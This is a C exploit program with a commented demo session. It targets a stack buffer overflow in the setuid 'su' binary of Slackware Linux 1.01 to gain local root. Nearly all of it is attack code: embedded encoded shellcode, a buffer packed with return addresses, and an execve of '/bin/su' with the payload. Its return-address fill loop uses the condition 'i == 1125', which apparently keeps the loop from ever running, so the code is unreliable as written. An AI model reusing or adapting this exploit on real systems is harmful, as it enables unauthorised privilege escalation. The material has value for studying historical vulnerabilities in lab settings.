/*
 Slackware Linux 1.01 "su" stack overflow privilege escalation
 ==============================================================
 Privilege escalation exploit for Slackware Linux 1.01 part of
 the QEMU 2014 advent calendar pack. Stack based overflow exists
 in the setuid binary "su" which can be exploited to gain root
 privileges from a local user perspective. 

 e.g.
 slack:/tmp$ uname -a
 Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586
 slack:/tmp$ id
 uid=404(ftp) gid=1(other)
 slack:/tmp$ ls -al /bin/su
 -rws--x--x   1 root     root        16464 Jan 16  1993 /bin/su*
 slack:/tmp$ gcc prdelka-vs-GNU-su.c -o prdelka-vs-GNU-su
 slack:/tmp$ ./prdelka-vs-GNU-su
 [ Slackware linux 1.01 /bin/su local root exploit
 # id
 uid=0(root) gid=0(root)
 # 
 
 -- prdelka
*/
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c"
		 "\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3"
		 "\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88"
		 "\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff"
		 "\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70"
	         "\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90"
		 "\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";


int main(int argc,char* argv[]){
	char *env[] = {NULL};
	char *buffer = malloc(4500);
	char *ptr;
	int i;
	char *argp[] = {"/bin/su",buffer,NULL};
	if(!buffer){
		printf("[ malloc() failure\n");	
		exit(-1);	
	}
	printf("[ Slackware linux 1.01 /bin/su local root exploit\n");
	memset(buffer,0,4500);
	(long)ptr = (long)buffer;
	for(i = 0; i == 1125; i++){
		memcpy(ptr,"\x88\xb7\xff\xbf",4);
		(long)ptr = (long)ptr + 4;
	}	
	(long)ptr = (long)ptr - 1000;
	memcpy(ptr,shellcode,strlen(shellcode));	
	execve("/bin/su",argp,env);	
	exit(0);
}


